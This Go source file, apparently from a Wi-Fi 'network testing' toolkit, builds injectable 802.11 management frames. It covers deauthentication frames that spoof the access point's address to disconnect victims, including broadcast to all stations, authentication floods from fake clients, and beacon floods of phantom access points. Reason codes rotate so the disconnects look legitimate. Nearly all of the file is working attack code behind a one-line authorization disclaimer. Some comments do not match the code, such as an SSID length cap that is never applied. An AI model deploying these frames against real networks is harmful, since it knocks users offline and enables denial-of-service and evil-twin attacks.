// GNULTE — network testing toolkit.
//
// Copyright (C) 2026 Neptune Productions.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see <https://www.gnu.org/licenses/>.

// Package airframes builds and injects 802.11 management frames.
//
// Management frames are how stations and access points negotiate and tear down
// associations. The builders here emit the frames GNULTE's Wi-Fi tests use:
//
//   - DeauthFrame: tells one station (or, via the broadcast address, all) that
//     its access point disconnected it. The source address is the AP's BSSID
//     so the victim reads the notice as coming from its own router.
//   - AuthFrame: an authentication request from a (possibly synthetic) client,
//     used to exercise an AP's authentication table.
//   - BeaconFrame: a synthetic access point advertisement, used to saturate
//     the wireless medium and test roaming/scanning behaviour.
//
// All frames carry an 8-byte radiotap prefix so they can be injected on a
// monitor-mode interface, where the NIC appends the FCS on transmit. Use them
// only on networks you own or are authorized to test.
package airframes

import (
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"os/exec"
	"strconv"
	"strings"
)

// MAC is a parsed, byte-order-natural 48-bit address.
type MAC struct {
	Addr [6]byte
}

// String renders the MAC in canonical lowercase colon form.
func (m MAC) String() string {
	return fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x",
		m.Addr[0], m.Addr[1], m.Addr[2], m.Addr[3], m.Addr[4], m.Addr[5])
}

// IsBroadcast reports whether all six octets are 0xff.
func (m MAC) IsBroadcast() bool {
	for _, b := range m.Addr {
		if b != 0xff {
			return false
		}
	}
	return true
}

// ParseMAC accepts colon, dash, dot-grouped Cisco, or bare hex forms
// (e.g. "00:0c:41:63:45:6a", "00-0C-41-63-45-6A", "000c4163456a").
func ParseMAC(s string) (MAC, error) {
	var m MAC
	clean := hexStr(s)
	if len(clean) != 12 {
		return m, fmt.Errorf("invalid MAC %q: expected 12 hex digits", s)
	}
	raw, err := hex.DecodeString(clean)
	if err != nil {
		return m, fmt.Errorf("invalid MAC %q: %w", s, err)
	}
	copy(m.Addr[:], raw)
	return m, nil
}

func hexStr(s string) string {
	out := make([]byte, 0, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == ':' || c == '-' || c == '.' {
			continue
		}
		out = append(out, c)
	}
	return string(out)
}

// Broadcast is the all-stations destination.
const Broadcast = "ff:ff:ff:ff:ff:ff"

// broadcast is the parsed broadcast MAC, reused by the builders.
var broadcast = func() MAC {
	m, _ := ParseMAC(Broadcast)
	return m
}()

// radiotap8 is the minimal radiotap prefix accepted by monitor-mode adapters.
func radiotap8() []byte {
	return []byte{0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00}
}

// mgmtHeader builds the radiotap prefix and the shared 802.11 header for a
// management frame: frame control (fc), duration, addr1 (destination),
// addr2 (source), addr3 (BSSID) and a rotating sequence number. The caller
// appends the frame body.
func mgmtHeader(fc byte, dst, src, bssid MAC, seq uint16) []byte {
	f := make([]byte, 0, 32)
	f = append(f, radiotap8()...)
	f = append(f, fc, 0x00)   // frame control low + flags
	f = append(f, 0x00, 0x00) // duration 0
	f = append(f, dst.Addr[:]...)
	f = append(f, src.Addr[:]...)
	f = append(f, bssid.Addr[:]...)
	f = append(f, byte(seq&0x00ff), byte(((seq&0x0f00)>>8)<<4))
	return f
}

// Reason codes commonly used in testing. 7 ("non-AP station leaving BSS") reads
// as a clean disconnect by the AP.
const (
	ReasonUnspecified           uint16 = 1
	ReasonDisassociatedNeedAuth uint16 = 2
	ReasonLeavingBSS            uint16 = 7
)

// DeauthFrame builds a Deauthentication management frame: a 34-byte
// radiotap + 802.11 frame with DA = victim, SA = BSSID, reason at the tail.
func DeauthFrame(bssid, station MAC, reason uint16, seq uint16) []byte {
	f := mgmtHeader(0xc0, station, bssid, bssid, seq)
	f = append(f, byte(reason&0x00ff), byte((reason&0xff00)>>8))
	return f
}

// DeauthFrameSize is the total length of a frame from DeauthFrame.
const DeauthFrameSize = 34

// AuthFrame builds an Authentication management frame for the open-system
// algorithm. SA is the (possibly synthetic) client: the AP only ever needs the
// source address and the body's algorithm/sequence/status fields to respond,
// so a flood of random clients exercises its authentication table.
func AuthFrame(bssid, client MAC, alg, seqNo, status uint16, seq uint16) []byte {
	f := mgmtHeader(0xb0, bssid, client, bssid, seq)
	f = append(f, byte(alg&0x00ff), byte((alg&0xff00)>>8))
	f = append(f, byte(seqNo&0x00ff), byte((seqNo&0xff00)>>8))
	f = append(f, byte(status&0x00ff), byte((status&0xff00)>>8))
	return f
}

// AuthFrameSize covers the radiotap prefix, header and 6-byte body.
const AuthFrameSize = 38

// BeaconFrame builds a synthetic Beacon advertisement: broadcast destination,
// the given BSSID as source, an SSID element, supported rates and a channel
// element. A flood of these saturates the medium with phantom access points.
func BeaconFrame(bssid MAC, ssid string, channel uint8, seq uint16) []byte {
	f := mgmtHeader(0x80, broadcast, bssid, bssid, seq)
	timestamp := []byte{0x00, 0x01, 0x02, 0x03, 0x00, 0x11, 0x22, 0x33} // synthetic TSF
	f = append(f, timestamp...)
	f = append(f, 0x64, 0x00)            // beacon interval 100
	f = append(f, 0x01, 0x00)            // capability: ESS
	f = append(f, 0x00, byte(len(ssid))) // SSID element (len capped below)
	f = append(f, []byte(ssid)...)
	rates := []byte{0x01, 0x08, 0x82, 0x84, 0x0b, 0x16, 0x24, 0x30, 0x48, 0x6c}
	f = append(f, rates...)
	f = append(f, 0x03, 0x01, channel)
	return f
}

// SetChannel switches a monitor-mode wireless interface to the given channel so
// injection follows an AP or a client that channel-hops. It uses `iw` (the same
// tool that put the interface into monitor mode), so it needs the same
// privileges as NewInjector; gnulte-wifi calls it under sudo. Every failure
// returns a descriptive error.
func SetChannel(iface string, ch uint8) error {
	if !InterfaceExists(iface) {
		return fmt.Errorf("interface %s does not exist", iface)
	}
	cmd := exec.Command("iw", "dev", iface, "set", "channel", strconv.Itoa(int(ch)))
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("iw set channel %d: %v (%s)", ch, err, strings.TrimSpace(string(out)))
	}
	return nil
}

// ParseChannels converts a comma-separated list like "1,6,11" or "36,40,44"
// into the uint8 channel list. It rejects empty or out-of-range entries.
func ParseChannels(list string) ([]uint8, error) {
	var out []uint8
	seen := map[uint8]bool{}
	for _, p := range strings.Split(list, ",") {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		n, err := strconv.Atoi(p)
		if err != nil || n < 1 || n > 196 {
			return nil, fmt.Errorf("invalid channel %q (1-196)", p)
		}
		ch := uint8(n)
		if !seen[ch] {
			seen[ch] = true
			out = append(out, ch)
		}
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no channels in list %q", list)
	}
	return out, nil
}

// ReasonCodes is the rotating reason-code set used when mixing is enabled. All
// of these are ordinary deauth reasons that read as a legitimate disconnect.
func ReasonCodes() []uint16 {
	return []uint16{ReasonUnspecified, ReasonDisassociatedNeedAuth, ReasonLeavingBSS, 8, 23}
}

// var errNotLinux is defined in the platform-specific injector file.
var errNotLinux error = errors.New("wifi frame injection is Linux-only (AF_PACKET raw sockets)")

// InterfaceExists checks for a live device of the given name.
func InterfaceExists(iface string) bool {
	nif, err := net.InterfaceByName(iface)
	return err == nil && nif != nil
}
